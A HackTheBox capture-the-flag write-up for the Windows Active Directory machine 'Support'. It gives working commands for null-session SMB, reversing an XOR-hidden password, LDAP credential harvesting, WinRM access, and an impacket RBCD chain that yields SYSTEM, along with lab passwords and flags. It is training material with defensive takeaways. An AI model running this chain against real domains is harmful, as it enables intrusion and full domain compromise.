---
type: writeup
platform: HTB
name: Support
os: Windows
difficulty: Easy
status: completed
tags: [htb, windows, easy, active-directory, smb, dotnet, reverse-engineering, xor, ldap, winrm, bloodhound, rbcd, kerberos, impacket]
techniques:
  - SMB anonymous (null session) enumeration
  - .NET binary decompilation with ilspycmd
  - XOR obfuscation reversal in Python
  - Authenticated LDAP enumeration
  - Password in LDAP info attribute
  - WinRM shell via evil-winrm
  - BloodHound AD path analysis
  - GenericAll ACL abuse
  - Resource-Based Constrained Delegation (RBCD)
  - S4U2Self / S4U2Proxy Kerberos ticket impersonation
tools:
  - nmap
  - smbclient
  - ilspycmd
  - ldapsearch
  - evil-winrm
  - bloodhound-python
  - BloodHound CE / Neo4j
  - impacket (addcomputer, rbcd, getST, psexec)
date: 2026-09-29
---

# Support — HackTheBox Writeup

![](images/Pasted%20image%2020260929000405.png)

---

## Summary

Support is an easy-difficulty Windows Active Directory machine that runs as a Domain Controller. The chain begins with anonymous SMB access to a non-standard share containing a custom .NET utility. Decompiling the binary reveals a hardcoded LDAP service account whose password is obfuscated with a reversible XOR scheme — trivially reversed in Python. An authenticated LDAP dump then exposes a plaintext password stashed in a user object's `info` field, granting a WinRM shell. BloodHound reveals the owned user's group holds `GenericAll` over the DC computer object, enabling a Resource-Based Constrained Delegation attack that yields a SYSTEM shell without ever knowing the Administrator password.

**Attack Chain:**
1. Nmap identifies a full AD DC port profile — DNS, Kerberos, LDAP, SMB, WinRM
2. Anonymous SMB list finds custom `support-tools` share → download `UserInfo.exe.zip`
3. Decompile .NET binary with `ilspycmd` → find hardcoded LDAP creds + XOR-obfuscated password
4. Reverse XOR in Python → recover `support\ldap` password
5. Dump AD with `ldapsearch` → find plaintext password in `support` user's `info` attribute
6. `evil-winrm` shell as `support` (WinRM member) → user flag
7. `bloodhound-python` + BloodHound → `Shared Support Accounts` has `GenericAll` on `DC$`
8. `impacket-addcomputer` → create `FAKE01$` computer account
9. `impacket-rbcd` → write `msDS-AllowedToActOnBehalfOfOtherIdentity` on DC using `support`'s rights
10. `impacket-getST` → S4U2Self/S4U2Proxy → `.ccache` ticket as Administrator
11. `impacket-psexec` with ticket → SYSTEM shell → root flag

**Flags:**
- User: `b70654cd9cfdd664b6b990e1a197f46c`
- Root: `1c711f1597476322d270ed2d64282053`

---

## Enumeration

### Nmap

![](images/Screenshot%202026-09-28%20230614.png)

```bash
nmap -sCV 10.129.147.6
```

![](images/Pasted%20image%2020260929000556.png)

| Port | Service | Notes |
|------|---------|-------|
| 53/tcp | DNS (Simple DNS Plus) | AD-integrated DNS — machines register here |
| 88/tcp | Kerberos | AD authentication protocol |
| 135/tcp | MSRPC | RPC endpoint mapper |
| 139/tcp | NetBIOS-SSN | Legacy SMB transport |
| 389/tcp | LDAP | AD directory — domain: `support.htb` |
| 445/tcp | SMB | File sharing |
| 464/tcp | kpasswd | Kerberos password change |
| 593/tcp | RPC over HTTP | Alt RPC transport |
| 636/tcp | LDAPS | Encrypted LDAP |
| 3268/tcp | Global Catalog LDAP | Forest-wide LDAP queries |
| 3269/tcp | Global Catalog LDAPS | Encrypted GC LDAP |
| 5985/tcp | **WinRM** | Remote PowerShell — key target once creds are found |

The combination of Kerberos + LDAP + Global Catalog + SMB immediately fingerprints this as a **Windows Active Directory Domain Controller**. The domain name leaks directly from the LDAP banner: `support.htb`.

WinRM on 5985 is noted early — it is the interactive shell vector once valid credentials for a `Remote Management Users` group member are obtained.

```bash
echo "10.129.147.6 dc.support.htb support.htb" | sudo tee -a /etc/hosts
```

---

### SMB Enumeration

![](images/Pasted%20image%2020260929000604.png)

```bash
smbclient -N -L //10.129.147.6/
```

![](images/Pasted%20image%2020260929000615.png)

Anonymous (null session) listing succeeds, returning six shares:

| Share | Type | Notes |
|-------|------|-------|
| `ADMIN$` | Disk | Default hidden admin share |
| `C$` | Disk | Default C: drive share |
| `IPC$` | IPC | RPC inter-process communication |
| `NETLOGON` | Disk | Default AD logon scripts share |
| `SYSVOL` | Disk | Default AD Group Policy share |
| **`support-tools`** | Disk | **Non-default — custom, added deliberately** |

The first five are all standard Windows/AD shares present on every DC. `support-tools` is the only non-default one, making it the immediate target.

![](images/Pasted%20image%2020260929000619.png)

```bash
smbclient -N //10.129.147.6/support-tools
smb: \> ls
```

![](images/Pasted%20image%2020260929000823.png)

```
7-ZipPortable_21.07.paf.exe
npp.8.4.1.portable.x64.zip
putty.exe
SysinternalsSuite.zip
UserInfo.exe.zip        <-- outlier
windirstat1_1_2_setup.exe
WiresharkPortable64_3.6.5.paf.exe
```

All the other files are well-known portable IT tools (7-Zip, Notepad++, PuTTY, Sysinternals, WinDirStat, Wireshark) — all last modified on the same date. `UserInfo.exe.zip` has a different modification date and a non-recognizable name, making it the clear target.

```bash
smb: \> get UserInfo.exe.zip
```

![](images/Pasted%20image%2020260929000833.png)

---

## Foothold

### .NET Binary Analysis — Decompiling UserInfo.exe

![](images/Pasted%20image%2020260929000837.png)

Unzipping reveals `UserInfo.exe` alongside a folder of DLLs including `Microsoft.Extensions.DependencyInjection.dll`, `System.Runtime.CompilerServices.Unsafe.dll`, and `CommandLineParser.dll` — confirming this is a **.NET application**.

![](images/Pasted%20image%2020260929000837%201.png)

**.NET decompilation advantage:** Unlike compiled C/C++ binaries, .NET executables compile to an intermediate language (IL/CIL) that retains class names, method names, and type information. This means a decompiler can reconstruct near-perfect C# source code from the binary.

![](images/Pasted%20image%2020260929000922.png)

Tool: `ilspycmd` — the CLI version of the open-source ILSpy .NET decompiler.

```bash
dotnet tool install -g ilspycmd --version 7.2.1.6856
export PATH="$PATH:$HOME/.dotnet/tools"
mkdir decompiled
ilspycmd UserInfo.exe -o decompiled/
```

![](images/Pasted%20image%2020260929011542.png)

The decompiled source reveals a CLI tool with two subcommands (`find`, `user`) that queries Active Directory over LDAP. The connection is made with a **hardcoded service account**:

```csharp
entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

The password is not stored in plaintext — it goes through a `Protected.getPassword()` method:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    for (int i = 0; i < array.Length; i++)
        array[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDF);
    return Encoding.Default.GetString(array);
}
```

![](images/Pasted%20image%2020260929011816.png)

### XOR Obfuscation Reversal

This is **not real encryption** — it is a reversible XOR obfuscation scheme. XOR is symmetric: applying the same operation twice returns the original value. Both the key (`"armando"`) and the constant (`0xDF`) are hardcoded in the binary we already decompiled.

Reversing it in Python:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = base64.b64decode(enc_password)
result = bytearray()
for i in range(len(data)):
    result.append((data[i] ^ key[i % len(key)]) ^ 0xDF)

print(result.decode("latin-1"))
```

![](images/Pasted%20image%2020260929011902.png)

**Recovered password:** `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

**Credentials:** `support\ldap` : `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

> Hiding a secret with reversible logic embedded in the same binary that uses it provides zero real protection once the binary is in an attacker's hands.

---

### Authenticated LDAP Enumeration

With valid domain credentials, LDAP returns far more attributes than an anonymous bind allows.

![](images/Pasted%20image%2020260929012148.png)

```bash
ldapsearch -x -H ldap://10.129.147.6 \
  -D "support\ldap" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" > ldap_dump.txt
```

This dumps the entire directory tree (5779 lines). Searching for credentials stashed in free-text attributes:

```bash
grep -i "^info" ldap_dump.txt
```

![](images/Pasted%20image%2020260929012851.png)

Result on the `support` user object:

```
cn: support
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

**Credentials:** `support` : `Ironside47pleasure40Watchful`

The `info` and `description` LDAP attributes are free-text fields that AD administrators frequently misuse to store passwords or notes — always grep for them in a dump.

Critically, this account is a member of **`Remote Management Users`** — the built-in AD group that grants WinRM access, mapping directly back to port 5985.

---

### WinRM Shell — evil-winrm

![](images/Pasted%20image%2020260929013251.png)

WinRM is Microsoft's remote management protocol (analogous to SSH for Linux). Any member of `Remote Management Users` can open an interactive PowerShell session remotely.

```bash
evil-winrm -i 10.129.147.6 -u support -p 'Ironside47pleasure40Watchful'
```

![](images/Pasted%20image%2020260929013445.png)

Interactive PowerShell shell as `support` on the domain controller.

```powershell
type C:\Users\support\Desktop\user.txt
# b70654cd9cfdd664b6b990e1a197f46c
```

**User flag obtained.**

---

## Privilege Escalation — RBCD via GenericAll on DC$

### BloodHound AD Path Analysis

![](images/Pasted%20image%2020260929013754.png)

`support` is a low-privilege domain user. Finding the path to Domain Admin requires mapping all ACL relationships in the domain — the standard tool for this is **BloodHound**.

Collect data via `bloodhound-python` (queries LDAP as an authenticated user, outputs JSON):

```bash
bloodhound-python -u ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -d support.htb -ns 10.129.147.6 -c all
```

![](images/Pasted%20image%2020260929013806.png)

Start BloodHound CE:
```bash
sudo neo4j start        # start the graph database
bloodhound-setup        # first-run only: creates Postgres DB, links Neo4j credentials
bloodhound-start        # start the BloodHound API + web UI
# Browse to http://localhost:8080
```

BloodHound CE uses **Neo4j** as its graph database and **PostgreSQL** as backing storage for the API. Two common Kali quirks to be aware of on first run:
- **PostgreSQL collation version mismatch** — fix with: `ALTER DATABASE bloodhound REFRESH COLLATION VERSION;` in `psql`
- **Neo4j password out of sync** — the BloodHound API reads its Neo4j credentials from `/etc/bhapi/bhapi.json`; if the Neo4j password was changed, update it there and restart

Default web UI credentials: `admin` / `admin` (forced password change on first login).

Upload the JSON files → mark `SUPPORT@SUPPORT.HTB` as owned → pathfind to `DOMAIN ADMINS@SUPPORT.HTB`.

![](images/Pasted%20image%2020260929014003.png)

**Path BloodHound reveals:**

```
SUPPORT
  --MemberOf-->  Shared Support Accounts
  --GenericAll-> DC.SUPPORT.HTB  (the DC's own computer object)
```

`GenericAll` on a computer object means full, unrestricted write access to every attribute on that object — including `msDS-AllowedToActOnBehalfOfOtherIdentity`, which controls **Resource-Based Constrained Delegation**.

---

### RBCD Attack

**Background:** Resource-Based Constrained Delegation lets the *resource* (here the DC) declare which accounts are trusted to impersonate users when accessing it. If an attacker controls the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a target computer, they can:

1. Name any account they control as a trusted delegator
2. Use that account to request a Kerberos ticket *as any domain user* (including Administrator) via **S4U2Self → S4U2Proxy**
3. Present that ticket to the target service — the DC honors it without the Administrator's actual password ever being used

The only prerequisite is a controllable account to name. By default, every authenticated domain user can register up to 10 computer accounts (`ms-DS-MachineAccountQuota = 10`).

**Step 1 — Create a fake computer account**

![](images/Pasted%20image%2020260929015528.png)

```bash
impacket-addcomputer support.htb/ldap:'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -computer-name 'FAKE01$' -computer-pass 'Fakepass123!' \
  -dc-ip 10.129.147.6
```

`FAKE01$` computer account created in AD.

**Step 2 — Write RBCD config on the DC (using support's GenericAll rights)**

![](images/Pasted%20image%2020260929015854.png)

```bash
impacket-rbcd \
  -delegate-from 'FAKE01$' -delegate-to 'DC$' \
  -action write -dc-ip 10.129.147.6 \
  support.htb/support:'Ironside47pleasure40Watchful'
```

This step **must** use `support` credentials — `ldap` does not hold `GenericAll` on the DC object. Running as `ldap` returns `INSUFF_ACCESS_RIGHTS`.

```
[*] Delegation rights modified successfully!
[*] FAKE01$ can now impersonate users on DC$ via S4U2Proxy
```

**Step 3 — Request a Kerberos ticket impersonating Administrator**

![](images/Pasted%20image%2020260929015903.png)

```bash
impacket-getST \
  -spn cifs/dc.support.htb \
  -impersonate Administrator \
  support.htb/'FAKE01$':'Fakepass123!' \
  -dc-ip 10.129.147.6
```

![](images/Pasted%20image%2020260929020015.png)

Produces `Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache` — a valid Kerberos `.ccache` ticket for the `cifs` service on the DC, issued in Administrator's name, obtained entirely without knowing Administrator's password.

**Step 4 — Use the ticket for a SYSTEM shell**

![](images/Pasted%20image%2020260929020044.png)

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

impacket-psexec -k -no-pass \
  support.htb/administrator@dc.support.htb \
  -dc-ip 10.129.147.6
```

![](images/Pasted%20image%2020260929020115.png)

`-k` instructs Impacket to use Kerberos auth via `KRB5CCNAME` instead of a password. `psexec` uploads a temporary service binary over SMB, registers it as a Windows service, and spawns an interactive `cmd.exe`.

![](images/Pasted%20image%2020260929020142.png)

```
NT AUTHORITY\SYSTEM
```

```cmd
type C:\Users\Administrator\Desktop\root.txt
# 1c711f1597476322d270ed2d64282053
```

![](images/Pasted%20image%2020260929020247.png)

**Root flag obtained.**

---

## Full Attack Chain

```
Anonymous SMB → support-tools share
  → UserInfo.exe.zip
    → .NET decompile (ilspycmd) → hardcoded support\ldap + XOR-obfuscated password
      → Python XOR reversal → plaintext LDAP password
        → ldapsearch authenticated dump
          → password in support user's "info" attribute
            → support ∈ Remote Management Users → evil-winrm shell
              USER FLAG
              → bloodhound-python → BloodHound CE
                → Shared Support Accounts --GenericAll--> DC$
                  → impacket-addcomputer → FAKE01$
                    → impacket-rbcd (as support) → FAKE01$ trusted to delegate on DC$
                      → impacket-getST → .ccache ticket as Administrator (S4U2Self/S4U2Proxy)
                        → impacket-psexec -k → NT AUTHORITY\SYSTEM
                          ROOT FLAG
```

---

## Key Takeaways

| Lesson | Detail |
|--------|--------|
| **Anonymous SMB is a foothold** | Null sessions on SMB expose share names and allow file download — always check with `-N` flag |
| **.NET binaries are readable** | IL retains class/method structure — `ilspycmd` or `dnSpy` recover near-perfect C# source |
| **XOR with a hardcoded key is not encryption** | Any reversible algorithm embedded in the same binary provides no protection |
| **Audit `info` and `description` LDAP attributes** | Administrators routinely store passwords in these free-text fields |
| **GenericAll on a computer object = full Kerberos identity control** | Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` enables impersonation of any domain user |
| **RBCD requires no privileged group membership** | Only write access to one attribute on a target computer + the default machine-account quota |
| **MachineAccountQuota enables RBCD prerequisite for free** | Any authenticated domain user can register up to 10 computer accounts by default |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port/service scanning, DC fingerprinting |
| smbclient | Null session share listing and file download |
| ilspycmd | .NET binary decompilation to C# source |
| ldapsearch | Authenticated AD LDAP dump |
| evil-winrm | Interactive PowerShell shell over WinRM |
| bloodhound-python | LDAP-based AD relationship/ACL collector |
| BloodHound CE + Neo4j | Graph-based AD attack path analysis |
| impacket-addcomputer | Create computer account in AD via LDAP |
| impacket-rbcd | Read/write `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| impacket-getST | S4U2Self + S4U2Proxy Kerberos ticket request |
| impacket-psexec | Remote SYSTEM shell via SMB + Windows Service Manager |
